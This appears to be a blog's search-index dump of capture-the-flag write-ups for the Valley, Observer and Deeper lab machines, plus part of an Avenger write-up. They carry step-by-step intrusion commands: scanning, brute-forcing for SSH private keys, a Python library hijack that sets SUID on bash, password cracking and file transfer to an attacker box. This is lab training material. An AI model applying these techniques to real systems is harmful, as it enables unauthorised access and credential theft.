(S-1-16-8192)SessionId : 1TokenId : 00000000-00511eacAuthenticationId : 00000000-0003f22aOriginId : 00000000-000003e7ModifiedId : 00000000-0003f238Source : User32 (00000000-0003f158)......```{: .nolineno}{: file='PrivescCheck.ps1 scan'}while enumeration I also got credentials for hugo â†’![Untitled](Avenger/Untitled%208.png)As I know that winrm , RDP port is active so lets have a proper shell â†’I tried from the evil-winrm to access Administrator directory but due to UAC enabled on system I have to grant permission of YES or NO then I can have that directory accesed and to grant the UAC I need to have RDP connection and do it manually .For Checking UAC enabled I checked this registory entry to verify that and I get the value as 5 that means the UAC is default enabled .```powershellREG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v ConsentPromptBehaviorAdmin```{: .nolineno}{: file='UAC Enable Check'}![Untitled](Avenger/Untitled%209.png)Now with Remmina Tool I got the RDP connection and I loaded the command prompt as Administrator and granted the UAC permission as YES and I got the Terminal of Adminstrator with that â†’![Untitled](Avenger/Untitled%2010.png)Now I can look into the directory of Administrator â†’![Untitled](Avenger/Untitled%2011.png)I finally got the root flag !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Valley", "url": "/posts/Valley/", "categories": "TryHackMe", "tags": "FTP, PrivEsc, UPX, pcapng, python", "date": "2023-11-28 00:00:00 +0530", "snippet": "TryHackMe Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#F...", "content": "TryHackMe Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#FTP&nbsp;&nbsp;#UPX&nbsp;&nbsp;#pcapng&nbsp;&nbsp;#python&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://tryhackme.com/room/valleype## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Valley]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.149.193 Nmap scan report for 10.10.149.193Host is up (0.17s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)| 256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)|_ 256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Site doesnt have a title (text/html).|_http-server-header: Apache/2.4.41 (Ubuntu)37370/tcp open ftp vsftpd 3.0.3Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I checked port 80 first and got a simple static webpage â†’![Untitled](Valley/Untitled%201.png)Now through Enumeration I for a gallery directory where I can load different images by changing its values like 1,2,3â€¦![Untitled](Valley/Untitled%202.png)Now I only tried the value as 0 and I got this output with a hidden directory â†’![Untitled](Valley/Untitled%203.png)on going to that directory I got this login webpage and after digging into its source code from dev.js file I got some credentials â†’![Untitled](Valley/Untitled%204.png)```{: .nolineno}siemDev : california```{: .nolineno}I also have FTP access so lets use this credentials to get some access â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Valley]â””â”€$ ftp 10.10.149.193 37370Connected to 10.10.149.193.220 (vsFTPd 3.0.3)Name (10.10.149.193:kali): siemDev331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||18601|)150 Here comes the directory listing.dr-xr-xr-x 2 1001 1001 4096 Mar 06 2023 .dr-xr-xr-x 2 1001 1001 4096 Mar 06 2023 ..-rw-rw-r-- 1 1000 1000 7272 Mar 06 2023 siemFTP.pcapng-rw-rw-r-- 1 1000 1000 1978716 Mar 06 2023 siemHTTP1.pcapng-rw-rw-r-- 1 1000 1000 1972448 Mar 06 2023 siemHTTP2.pcapng226 Directory send OK.ftp>```{: .nolineno}I downloaded all these files and enumerated further more :After sometime while enumeration on `siemHTTP2.pcapng` file I got this credentail â†’![Untitled](Valley/Untitled%205.png)Lets Login into the machine â†’## SSH Shell âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Valley]â””â”€$ ssh valleyDev@10.10.149.193 valleyDev@10.10.149.193 is password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage * Introducing Expanded Security Maintenance for Applications. Receive updates to over 25,000 software packages with your Ubuntu Pro subscription. Free for personal use. https://ubuntu.com/provalleyDev@valley:~$ whoamivalleyDevvalleyDev@valley:~$ iduid=1002(valleyDev) gid=1002(valleyDev) groups=1002(valleyDev)valleyDev@valley:~$```{: .nolineno}Now I changed the username to siemDev with that FTP password and found an executable binary file named as `valleyAuthenticator` I transfered that file to attacker machine â†’```bashsiemDev@valley:/home$ ls -altotal 752drwxr-xr-x 5 root root 4096 Mar 6 2023 .drwxr-xr-x 21 root root 4096 Mar 6 2023 ..drwxr-x--- 4 siemDev siemDev 4096 Mar 20 2023 siemDevdrwxr-x--- 16 valley valley 4096 Mar 20 2023 valley-rwxrwxr-x 1 valley valley 749128 Aug 14 2022 valleyAuthenticatordrwxr-xr-x 5 valleyDev valleyDev 4096 Mar 13 2023 valleyDevsiemDev@valley:/home$ ./valleyAuthenticator Welcome to Valley Inc. AuthenticatorWhat is your username: valleyWhat is your password: valleyWrong Password or UsernamesiemDev@valley:/home$```{: .nolineno}Lets dig into this `valleyAuthenticator` file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Valley]â””â”€$ file valleyAuthenticator valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Valley]â””â”€$ strings valleyAuthenticator | headUPX!\"E&8/p8Sa64\\o+_x?pO)_h`/50*FX/6/P@/8_P4Ao```{: .nolineno}> I got to know about UPX file that is used for Advanced compress of a file up to 50%-70% of a file.{: .prompt-info }In this case our executable elf binary file is compressed with UPX so we have to decompress it and for that kali linux have default installed UPX on their system and for more info follow this URL â†’ [âš¡PATH](https://www.iblue.team/malware-analysis/identifying-upx-packed-elf-decompressing-fixing-and-analysing-linux-malware)![Untitled](Valley/Untitled%206.png)I got this binary ELF file `valleyAuthenticator.elf` â†’![Untitled](Valley/Untitled%207.png)Lets decode this MD5 hashes so that I can get my username & password .![Untitled](Valley/Untitled%208.png)I am now valley and I found this root privileged directory and its `photosEncrypt.py` file â†’```bashsiemDev@valley:/home$ su valleyPassword: valley@valley:/home$ whoamivalleyvalley@valley:/home$ iduid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)valley@valley:/home$ cd /photos/script/valley@valley:/photos/script$ ls -al photosEncrypt.py -rwxr-xr-x 1 root root 621 Mar 6 2023 photosEncrypt.pyvalley@valley:/photos/script$ cat photosEncrypt.py #!/usr/bin/python3import base64for i in range(1,7):# specify the path to the image file you want to encode\timage_path = \"/photos/p\" + str(i) + \".jpg\"# open the image file and read its contents\twith open(image_path, \"rb\") as image_file: image_data = image_file.read()# encode the image data in Base64 format\tencoded_image_data = base64.b64encode(image_data)# specify the path to the output file\toutput_path = \"/photos/photoVault/p\" + str(i) + \".enc\"# write the Base64-encoded image data to the output file\twith open(output_path, \"wb\") as output_file: \t output_file.write(encoded_image_data)valley@valley:/photos/script$```{: .nolineno}It is using base64 module lets see I can alter it or not â†’```bashvalley@valley:/photos/script$ ls -al /usr/lib/python3.8/base64.py-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13 2023 /usr/lib/python3.8/base64.pyvalley@valley:/photos/script$ iduid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)valley@valley:/photos/script$```{: .nolineno}As I am part of `valleyadmin` group so I can edit it so lets add some executable so that it will be executed as root user as I ran `pspy64` tool and it is executing each minute â†’![Untitled](Valley/Untitled%209.png)```bashvalley@valley:~$ echo 'import os; os.system(\"chmod +s /bin/bash\");' >> /usr/lib/python3.8/base64.pyvalley@valley:~$ ls -al /bin/bash-rwxr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashvalley@valley:~$ ls -al /bin/bash-rwxr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashvalley@valley:~$ ls -al /bin/bash-rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bashvalley@valley:~$valley@valley:~$ /bin/bash -pbash-5.0# whoamirootbash-5.0# iduid=1000(valley) gid=1000(valley) euid=0(root) egid=0(root) groups=0(root),1000(valley),1003(valleyAdmin)bash-5.0# cd /rootbash-5.0# ls -altotal 56drwx------ 8 root root 4096 Mar 13 2023 .drwxr-xr-x 21 root root 4096 Mar 6 2023 ..-rw------- 1 root root 0 Mar 21 2023 .bash_history-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwx------ 2 root root 4096 Mar 20 2023 .cachedrwxr-xr-x 4 root root 4096 Mar 6 2023 .configdrwx------ 4 root root 4096 Aug 15 2022 .gnupgdrwxr-xr-x 3 root root 4096 Aug 11 2022 .local-rw------- 1 root root 49 Mar 3 2023 .mysql_history-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw-r--r-- 1 root root 37 Mar 13 2023 root.txt-rw-r--r-- 1 root root 66 Aug 15 2022 .selected_editordrwx------ 3 root root 4096 Aug 11 2022 snapdrwx------ 2 root root 4096 Aug 14 2022 .ssh-rw-r--r-- 1 root root 222 Aug 15 2022 .wget-hstsbash-5.0# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: ens5: mtu 9001 qdisc mq state UP group default qlen 1000 link/ether 02:fa:c5:3e:12:99 brd ff:ff:ff:ff:ff:ff inet 10.10.230.7/16 brd 10.10.255.255 scope global dynamic ens5 valid_lft 2930sec preferred_lft 2930sec inet6 fe80::fa:c5ff:fe3e:1299/64 scope link valid_lft forever preferred_lft foreverbash-5.0# hostnamevalleybash-5.0#```{: .nolineno}I am Root Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Observer", "url": "/posts/Observer/", "categories": "HackMyVM", "tags": "Fuzzing, PrivEsc, Soft_Link", "date": "2023-11-27 00:00:00 +0530", "snippet": "HackMyVM Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Fuzzing&nbsp;&nbsp;#Soft_Link&nbsp;&nbsp;&nbsp;&nbs...", "content": "HackMyVM Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Fuzzing&nbsp;&nbsp;#Soft_Link&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## Port Scan Results â¤µï¸![Untitled](Observer/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Observer]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.0.2.83 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-27 12:42 ISTNmap scan report for 10.0.2.83Host is up (0.0011s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)| ssh-hostkey: | 256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)|_ 256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)3333/tcp open dec-notes?| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 200 OK| Date: Mon, 27 Nov 2023 07:13:06 GMT| Content-Length: 105| Content-Type: text/plain; charset=utf-8| OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST | | GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest: | HTTP/1.0 200 OK| Date: Mon, 27 Nov 2023 07:12:41 GMT| Content-Length: 78| Content-Type: text/plain; charset=utf-8| OBSERVING FILE: /home/ NOT EXIST | | HTTPOptions: | HTTP/1.0 200 OK| Date: Mon, 27 Nov 2023 07:12:41 GMT| Content-Length: 78| Content-Type: text/plain; charset=utf-8| OBSERVING FILE: /home/ NOT EXIST |_ 1 service unrecognized despite returning data.```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I checked port 80 â†’![Untitled](Observer/Untitled%202.png)It can reads the content from `home` directory means inside the home directory I have to find the `username` and the file name to read so I used `ffuf Tool` for username bruteforce â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Observer]â””â”€$ ffuf -c -mc 200,301,302,401 -fc 404,500,401 -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 'http://10.0.2.83:3333/FUZZ/.ssh/id_rsa' -fw 8 -fl 4 -o ffuf_parameter /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.1.0-dev________________________________________________ :: Method : GET :: URL : http://10.0.2.83:3333/FUZZ/.ssh/id_rsa :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt :: Output file : ffuf_parameter :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,301,302,401 :: Filter : Response status: 404,500,401 :: Filter : Response words: 8 :: Filter : Response lines: 4________________________________________________cgi-bin/ [Status: 301, Size: 55, Words: 3, Lines: 3, Duration: 14ms]jan [Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 10ms]:: Progress: [20476/20476] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:06] :: Errors: 0 ::```{: .nolineno}I got the username as `jan` and I used the file name as `.ssh/id_rsa` , That gives me the private keys of that user and I can login now â†’![Untitled](Observer/Untitled%203.png)Now lets Login â†’## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Observer]â””â”€$ ssh -i id_rsa jan@10.0.2.83Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Nov 27 08:53:33 2023 from 10.0.2.77jan@observer:~$ whoamijanjan@observer:~$ iduid=1000(jan) gid=1000(jan) grupos=1000(jan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)jan@observer:~$ hostnameobserverjan@observer:~$```{: .nolineno}lets see the sudoer file that can lead me to root â†’```bashjan@observer:~$ sudo -lMatching Defaults entries for jan on observer: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser jan may run the following commands on observer: (ALL) NOPASSWD: /usr/bin/systemctl -l statusjan@observer:~$```{: .nolineno}I tried it and observed that the system processes are running `/opt/observer` as we can see from its web server part through root user â†’![Untitled](Observer/Untitled%204.png)As this is ran through root user so I cna try to access the root files through the web application so for that I need to create a soft link that will redirect to the root directory .```bashjan@observer:~$ ln -s /root rootjan@observer:~$ ls -altotal 40drwx------ 4 jan jan 4096 nov 27 09:29 .drwxr-xr-x 3 root root 4096 ago 21 20:19 ..-rw------- 1 jan jan 711 nov 27 09:21 .bash_history-rw-r--r-- 1 jan jan 220 ago 21 20:19 .bash_logout-rw-r--r-- 1 jan jan 3526 ago 21 20:19 .bashrcdrwxr-xr-x 3 jan jan 4096 ago 21 20:21 .local-rw-r--r-- 1 jan jan 807 ago 21 20:19 .profilelrwxrwxrwx 1 jan jan 5 nov 27 09:29 root -> /rootdrwx------ 2 jan jan 4096 ago 21 20:25 .ssh-rw------- 1 jan jan 24 ago 21 20:21 user.txt-rw------- 1 jan jan 54 ago 21 20:21 .Xauthorityjan@observer:~$jan@observer:~$ cd root-bash: cd: root: Permiso denegadojan@observer:~$```{: .nolineno}Now Lets access `.bash_history` file common known file in a user directory â†’![Untitled](Observer/Untitled%205.png)I got the root password from here so lets Login and be a root user â†’```bashjan@observer:~$ su rootContraseÃ±a: su: Fallo de autenticaciÃ³njan@observer:~$ su rootContraseÃ±a: root@observer:/home/jan# cd ~root@observer:~# whoamirootroot@observer:~# iduid=0(root) gid=0(root) grupos=0(root)root@observer:~# hostnameobserverroot@observer:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host noprefixroute valid_lft forever preferred_lft forever2: enp0s3: mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:48:8b:ad brd ff:ff:ff:ff:ff:ff inet 10.0.2.83/24 brd 10.0.2.255 scope global dynamic enp0s3 valid_lft 331sec preferred_lft 331sec inet6 fe80::a00:27ff:fe48:8bad/64 scope link valid_lft forever preferred_lft foreverroot@observer:~# cat root.txtFLAG-------FLAG-------FLAGroot@observer:~# ls -altotal 52drwx------ 5 root root 4096 nov 27 09:29 .drwxr-xr-x 18 root root 4096 ago 21 20:17 ..-rw------- 1 root root 668 nov 27 09:21 .bash_history-rw-r--r-- 1 root root 571 abr 10 2021 .bashrcdrwxr-xr-x 3 root root 4096 ago 21 20:23 .cache-rw------- 1 root root 55 nov 27 09:29 .lesshstdrwxr-xr-x 3 root root 4096 ago 21 20:23 .local-rw-r--r-- 1 root root 913 ago 21 20:23 observer.go-rw-r--r-- 1 root root 161 jul 9 2019 .profile-rw------- 1 root root 24 ago 21 20:24 root.txt-rw-r--r-- 1 root root 66 ago 21 20:23 .selected_editordrwx------ 2 root root 4096 ago 21 20:15 .ssh-rw-r--r-- 1 root root 161 ago 21 20:22 .wget-hstsroot@observer:~#```{: .nolineno}Now am Root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Deeper", "url": "/posts/Deeper/", "categories": "HackMyVM", "tags": "PrivEsc, enum, fcrackzip, scp", "date": "2023-11-27 00:00:00 +0530", "snippet": "HackMyVM Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#scp&nbsp;&nbsp;#fcrackzip&nbsp;&nbsp;#enum&nbsp;&nb...", "content": "HackMyVM Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#scp&nbsp;&nbsp;#fcrackzip&nbsp;&nbsp;#enum&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## Port Scan Results â¤µï¸![Untitled](Deeper/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Deeper]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.0.2.82 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-27 12:08 ISTNmap scan report for 10.0.2.82Host is up (0.00083s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)| ssh-hostkey: | 256 37:d1:6f:b5:a4:96:e8:78:18:c7:77:d0:3e:20:4e:55 (ECDSA)|_ 256 cf:5d:90:f3:37:3f:a4:e2:ba:d5:d7:25:c6:4a:a0:61 (ED25519)80/tcp open http Apache httpd 2.4.57 ((Debian))|_http-title: Deeper|_http-server-header: Apache/2.4.57 (Debian)MAC Address: 08:00:27:58:E3:E2 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸While checking port 80 â†’![Untitled](Deeper/Untitled%202.png)I checked the source code and got the `PATH` â†’![Untitled](Deeper/Untitled%203.png)After going in this path I got the credentials â†’![Untitled](Deeper/Untitled%204.png)and Password through scrolling further more â†’![Untitled](Deeper/Untitled%205.png)Now I decoded these encodings/hashes and got the results for SSH Login â†’I used [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/) and [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) for cracking of these hashes â†’![Untitled](Deeper/Untitled%206.png)After cracking password I logged in as user Alice .## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Deeper]â””â”€$ ssh alice@10.0.2.82 The authenticity of host '10.0.2.82 (10.0.2.82)' can not be established.ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.82' (ED25519) to the list of known hosts.alice@10.0.2.82 is password: Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Aug 26 00:38:16 2023 from 192.168.100.103alice@deeper:~$ ls -altotal 32drwxr--r-- 3 alice alice 4096 Aug 26 00:14 .drwxr-xr-x 4 root root 4096 Aug 25 20:07 ..lrwxrwxrwx 1 alice alice 9 Aug 25 19:01 .bash_history -> /dev/null-rw-r--r-- 1 alice alice 220 Aug 25 17:58 .bash_logout-rw-r--r-- 1 alice alice 3526 Aug 25 17:58 .bashrc-rw-r--r-- 1 alice alice 41 Aug 25 20:43 .bob.txtdrwxr-xr-x 3 alice alice 4096 Aug 26 00:14 .local-rw-r--r-- 1 alice alice 807 Aug 25 17:58 .profile-rw-r--r-- 1 alice alice 33 Aug 26 00:14 user.txtalice@deeper:~$```{: .nolineno}Now I got the encoded password for bob user from `.bob.txt` file .I Logged in as bob user â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Deeper]â””â”€$ ssh bob@10.0.2.84 The authenticity of host '10.0.2.84 (10.0.2.84)' can not be established.ED25519 key fingerprint is SHA256:LsWOF4O2aDb/w6V7Z5VEAcjNfkxMmPOzyEIC7HMr91o.This host key is known by the following other names/addresses: ~/.ssh/known_hosts:17: [hashed name]Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.84' (ED25519) to the list of known hosts.bob@10.0.2.84 is password: Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Aug 26 00:05:57 2023 from 192.168.100.103bob@deeper:~$ ls -altotal 28drwxr--r-- 3 bob bob 4096 Aug 26 00:22 .drwxr-xr-x 4 root root 4096 Aug 25 20:07 ..lrwxrwxrwx 1 bob bob 9 Aug 25 20:44 .bash_history -> /dev/null-rw-r--r-- 1 bob bob 220 Apr 23 2023 .bash_logout-rw-r--r-- 1 bob bob 3526 Apr 23 2023 .bashrcdrwxr-xr-x 3 bob bob 4096 Aug 25 20:17 .local-rw-r--r-- 1 bob bob 807 Aug 25 20:09 .profile-rw-r--r-- 1 bob bob 215 Aug 26 00:21 root.zipbob@deeper:~$ file root.zip root.zip: Zip archive data, at least v1.0 to extract, compression method=storebob@deeper:~$ unzip -bash: unzip: command not foundbob@deeper:~$```{: .nolineno}I have to transfer this `root.zip` file to the attacker machine so for that I used the command `scp` that id used to transfer files.```bashbob@deeper:~$ scp root.zip kali@10.0.2.77:~/Downloads/HackMyVM/Deeper/root.zipkali@10.0.2.77's password: root.zip 100% 215 82.9KB/s 00:00 bob@deeper:~$```{: .nolineno} Now this file is password protected to I used another Tool called as `fcrackzip` to crack this zip file password â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Deeper]â””â”€$ sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt root.zipPASSWORD FOUND!!!!: pw == bob```{: .nolineno}Now I extracted the password of root user from it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Deeper]â””â”€$ unzip root.zip Archive: root.zip[root.zip] root.txt password: extracting: root.txt```{: .nolineno}Now I am root !!```bashbob@deeper:~$ su rootPassword: root@deeper:/home/bob# cd ~root@deeper:~# ls -altotal 32drwx------ 4 root root 4096 Aug 26 00:48 .drwxr-xr-x 18 root root 4096 Aug 25 17:55 ..lrwxrwxrwx 1 root root 9 Aug 25 18:56 .bash_history -> /dev/null-rw-r--r-- 1 root root 571 Apr 10 2021 .bashrc-rw------- 1 root root 20 Aug 25 23:57 .lesshstdrwxr-xr-x 3 root root 4096 Aug 25 19:53 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r--r-- 1 root root 33 Aug 26 00:48 root.txtdrwx------ 2 root root 4096 Aug 25 17:52 .sshroot@deeper:~# whoamirootroot@deeper:~# iduid=0(root) gid=0(root) groups=0(root)root@deeper:~# hostnamedeeperroot@deeper:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host noprefixroute valid_lft forever preferred_lft forever2: enp0s3: mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:33:4f:51 brd ff:ff:ff:ff:ff:ff inet 10.0.2.84/24 brd 10.0.2.255 scope global dynamic enp0s3 valid_lft 440sec preferred_lft 440sec inet6 fe80::a00:27ff:fe33:4f51/64 scope link valid_lft forever preferred_lft foreverroot@deeper:~# cat root.txtFLAG----FLAG----FLAG----FLAGroot@deeper:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Clicker", "url": "/posts/Clicker/", "categories": "HackTheBox", "tags": "CRLF, NFS, RFI, perl, putty_gen, PrivEsc", "date": "2023-11-18 00:00:00 +0530", "snippet": "HackTheBox Machine âž¡ï¸ &nbsp;&nbsp;Medium &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#CRLF&nbsp;&nbsp;#NFS&nbsp;&nbsp;#RFI&nbsp;&nbsp...", "content": "HackTheBox Machine âž¡ï¸ &nbsp;&nbsp;Medium 